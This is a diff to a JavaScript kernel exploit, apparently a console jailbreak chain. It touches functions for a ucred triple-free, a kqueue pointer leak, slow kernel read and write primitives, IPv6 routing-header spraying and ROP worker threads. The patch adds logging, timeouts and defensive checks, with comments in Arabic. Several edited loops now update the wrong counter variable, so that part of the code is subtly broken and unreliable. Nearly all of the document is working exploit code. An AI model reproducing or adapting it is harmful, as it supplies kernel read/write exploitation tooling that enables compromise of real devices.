@@ -418,51 +418,76 @@ function create_workers() {
   return true;
 }
 function init_workers() {
-  var ret;
+  let ret;
 
   // iov_recvmsg workers
-  for (var i = 0; i < IOV_THREAD_NUM; i++) {
-    var w = iov_recvmsg_workers[i];
+  for (let i = 0; i < IOV_THREAD_NUM; i++) {
+    const w = iov_recvmsg_workers[i];
+
     if (!w || !w.rop) {
       log('init_workers: invalid iov_recvmsg_workers[' + i + ']');
       return false;
     }
+
     ret = spawn_thread(w.rop, w.loop_size);
     if (ret.eq(BigInt_Error)) {
       log('init_workers: spawn_thread failed for iov_recvmsg_workers[' + i + ']');
       return false;
     }
+
     w.thread_id = Number(ret.and(0xFFFFFFFF));
+
+    // أهم إصلاح — منع freeze بسبب thread_id فاسد
+    if (!w.thread_id || w.thread_id <= 0 || isNaN(w.thread_id)) {
+      log('init_workers: invalid thread_id for iov_recvmsg_workers[' + i + ']');
+      return false;
+    }
   }
 
   // uio_readv workers
-  for (var j = 0; j < UIO_THREAD_NUM; j++) {
-    var w2 = uio_readv_workers[j];
+  for (let j = 0; j < UIO_THREAD_NUM; j++) {
+    const w2 = uio_readv_workers[j];
+
     if (!w2 || !w2.rop) {
       log('init_workers: invalid uio_readv_workers[' + j + ']');
       return false;
     }
+
     ret = spawn_thread(w2.rop, w2.loop_size);
     if (ret.eq(BigInt_Error)) {
       log('init_workers: spawn_thread failed for uio_readv_workers[' + j + ']');
       return false;
     }
+
     w2.thread_id = Number(ret.and(0xFFFFFFFF));
+
+    if (!w2.thread_id || w2.thread_id <= 0 || isNaN(w2.thread_id)) {
+      log('init_workers: invalid thread_id for uio_readv_workers[' + j + ']');
+      return false;
+    }
   }
 
   // uio_writev workers
-  for (var k = 0; k < UIO_THREAD_NUM; k++) {
-    var w3 = uio_writev_workers[k];
+  for (let k = 0; k < UIO_THREAD_NUM; k++) {
+    const w3 = uio_writev_workers[k];
+
     if (!w3 || !w3.rop) {
       log('init_workers: invalid uio_writev_workers[' + k + ']');
       return false;
     }
+
     ret = spawn_thread(w3.rop, w3.loop_size);
     if (ret.eq(BigInt_Error)) {
       log('init_workers: spawn_thread failed for uio_writev_workers[' + k + ']');
       return false;
     }
+
     w3.thread_id = Number(ret.and(0xFFFFFFFF));
+
+    if (!w3.thread_id || w3.thread_id <= 0 || isNaN(w3.thread_id)) {
+      log('init_workers: invalid thread_id for uio_writev_workers[' + k + ']');
+      return false;
+    }
   }
 
   return true;
@@ -473,8 +498,16 @@ function nanosleep_fun(nsec) {
   nanosleep(nanosleep_timespec);
 }
 function wait_for(addr, threshold) {
+  var spins = 0;
+  var MAX_SPINS = 100000; // أو أقل حسب إحساسك
+
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(1);
+    spins++;
+    if (spins >= MAX_SPINS) {
+      log('wait_for: timeout waiting for ' + hex(addr));
+      break;
+    }
   }
 }
 function trigger_iov_recvmsg() {
@@ -806,14 +839,21 @@ function find_twins() {
 
   while (count < MAX_ROUNDS_TWIN) {
 
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
-        log(' Jailbreak failed!');
-        cleanup();
-        return false;
-      }
-    } else zeroMemoryCount = 0;
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
+        zeroMemoryCount++;
+        if (zeroMemoryCount >= 5) {
+            log(' Jailbreak failed!');
+            cleanup();
+            return BigInt_Error;
+        }
+
+    } else {
+        zeroMemoryCount = 0;
+    }
 
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
@@ -1111,10 +1151,12 @@ function find_allproc() {
   var pipe_1 = master_pipe[1];
 
   if (pipe_0 < 0 || pipe_1 < 0) {
+    log('find_allproc: invalid master_pipe fds');
     return new BigInt(0);
   }
 
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
+  debug('find_allproc - Getting pid...');
   var pid = Number(getpid());
   debug('find_allproc - pid: ' + pid);
 
@@ -1143,6 +1185,7 @@ function find_allproc() {
 
   kernel.addr.curproc = p; // Set global curproc
 
+  debug('find_allproc - Walking process list...');
   var walk_count = 0;
   var mask = new BigInt(0xFFFFFFFF, 0x00000000);
 
@@ -1519,6 +1562,7 @@ function trigger_ucred_triplefree() {
   return true;
 }
 function leak_kqueue() {
+  debug('Leaking ...');
 
   // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
@@ -1534,6 +1578,7 @@ function leak_kqueue() {
 
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
+      log('leak_kqueue: kqueue() failed');
       return false;
     }
 
@@ -1563,6 +1608,7 @@ function leak_kqueue() {
   kq_fdp  = read64(leak_rthdr.add(0x98));
 
   if (kq_fdp.eq(0)) {
+    log('Failed to leak kqueue_fdp');
     return false;
   }
 
@@ -1585,8 +1631,10 @@ function leak_kqueue_safe() {
   }
 }
 function kreadslow64(address) {
+  debug('kreadslow64: addr=' + hex(address));
 
   if (address.eq(0)) {
+    log('kreadslow64: invalid address 0');
     return BigInt_Error;
   }
 
@@ -1599,15 +1647,15 @@ function kreadslow64(address) {
 }
 
 function kreadslow64_safe(address) {
-
   if (address.eq(0)) {
     return BigInt_Error;
   }
 
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - Reboot and try again');
+    log('kreadslow64_safe: kreadslow failed at ' + hex(address));
+    // لا cleanup، لا throw
+    return BigInt_Error;
   }
   return read64(buffer);
 }
@@ -1628,15 +1676,21 @@ function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
 
   if (addr.eq(0) || size <= 0) {
+    log('kreadslow: invalid addr/size');
     return BigInt_Error;
   }
 
   // Memory exhaustion check
-  if (debugging.info.memory.available === 0) {
-    log('kreadslow - Memory exhausted before start');
-    cleanup();
-    return BigInt_Error;
+  if (typeof debugging !== 'undefined' &&
+      debugging.info &&
+      debugging.info.memory &&
+      debugging.info.memory.available === 0) {
+
+      log('kreadslow - Memory exhausted before start');
+      cleanup();
+      return BigInt_Error;
   }
+  debug('kreadslow - Preparing buffers...');
 
   // Prepare leak buffers.
   var leak_buffers = new Array(UIO_THREAD_NUM);
@@ -1661,6 +1715,7 @@ function kreadslow(addr, size) {
 
   // تأكيد صلاحية triplets[1]
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
+    log('kreadslow - invalid triplets[1]');
     return BigInt_Error;
   }
 
@@ -1675,7 +1730,10 @@ function kreadslow(addr, size) {
 
   // Reclaim with uio.
   while (count < KREAD_MAX_KQ) {
-    if (debugging.info.memory.available === 0) {
+    if (typeof debugging !== 'undefined' &&
+      debugging.info &&
+      debugging.info.memory &&
+      debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         log(' Jailbreak failed!');
@@ -1725,6 +1783,7 @@ function kreadslow(addr, size) {
 
   // تأكيد صلاحية triplets[2]
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
+    log('kreadslow - invalid triplets[2]');
     return BigInt_Error;
   }
 
@@ -1740,15 +1799,20 @@ function kreadslow(addr, size) {
   var count2 = 0;
   while (true) {
     count2++;
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++;
-      if (zeroMemoryCount2 >= 5) {
-        log(' Jailbreak failed!');
-        cleanup();
-        return BigInt_Error;
-      }
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
+        zeroMemoryCount++;
+        if (zeroMemoryCount >= 5) {
+            log(' Jailbreak failed!');
+            cleanup();
+            return BigInt_Error;
+        }
+
     } else {
-      zeroMemoryCount2 = 0;
+        zeroMemoryCount = 0;
     }
 
     // Reclaim with iov.
@@ -1768,6 +1832,7 @@ function kreadslow(addr, size) {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
 
+  debug('kreadslow - Reading leak buffers...');
 
   // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size);
@@ -1782,6 +1847,7 @@ function kreadslow(addr, size) {
     var val = read64(leak_buffers[_i13]);
     debug('kreadslow - leak_buffers[' + _i13 + ']: ' + hex(val));
     if (!val.eq(tag_val)) {
+      debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
       // Find triplet.
       triplets[1] = find_triplet(triplets[0], -1);
       debug('kreadslow - triplets[1]=' + triplets[1]);
@@ -1796,11 +1862,13 @@ function kreadslow(addr, size) {
   write(new BigInt(iov_sock_1), tmp, 1);
 
   if (leak_buffer.eq(0)) {
+    debug('kreadslow - No valid leak found');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
 
+  debug('kreadslow - Finding triplets[2]...');
 
   // Find triplet[2].
   for (var retry = 0; retry < 3; retry++) {
@@ -1825,9 +1893,11 @@ function kreadslow(addr, size) {
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
+  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size: ' + size);
 
   // حراسة على المدخلات
   if (addr.eq(0) || size <= 0) {
+    log('kwriteslow: invalid addr/size');
     return BigInt_Error;
   }
   if (buffer.eq(0)) {
@@ -1837,9 +1907,11 @@ function kwriteslow(addr, buffer, size) {
 
   // تأكيد صلاحية triplets[1] و triplets[2] قبل الاستخدام
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[1]');
     return BigInt_Error;
   }
   if (triplets[0] < 0 || triplets[0] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[0]');
     return BigInt_Error;
   }
 
@@ -1859,15 +1931,20 @@ function kwriteslow(addr, buffer, size) {
   // Reclaim with uio.
   var zeroMemoryCount = 0;
   while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
-        log(' Jailbreak failed!');
-        cleanup();
-        return BigInt_Error;
-      }
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
+        zeroMemoryCount++;
+        if (zeroMemoryCount >= 5) {
+            log(' Jailbreak failed!');
+            cleanup();
+            return BigInt_Error;
+        }
+
     } else {
-      zeroMemoryCount = 0;
+        zeroMemoryCount = 0;
     }
 
     trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
@@ -1895,6 +1972,7 @@ function kwriteslow(addr, buffer, size) {
 
   // تأكيد صلاحية triplets[2] قبل الـ free
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
+    log('kwriteslow: invalid triplets[2] before free');
     return BigInt_Error;
   }
 
@@ -1907,15 +1985,20 @@ function kwriteslow(addr, buffer, size) {
   // Reclaim uio with iov.
   var zeroMemoryCount2 = 0;
   while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++;
-      if (zeroMemoryCount2 >= 5) {
-        log(' Jailbreak failed!');
-        cleanup();
-        return BigInt_Error;
-      }
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
+        zeroMemoryCount++;
+        if (zeroMemoryCount >= 5) {
+            log(' Jailbreak failed!');
+            cleanup();
+            return BigInt_Error;
+        }
+
     } else {
-      zeroMemoryCount2 = 0;
+        zeroMemoryCount = 0;
     }
 
     // Reclaim with iov.
@@ -2359,5 +2442,12 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     loop_size: 0 // loop_size
   };
 }
-netctrl_exploit();
-// cleanup();
+try {
+  netctrl_exploit();
+} catch (e) {
+  log('ERROR in netctrl_exploit: ' + e.message);
+  cleanup(true);
+  if (typeof show_fail === 'function') {
+    show_fail();
+  }
+}
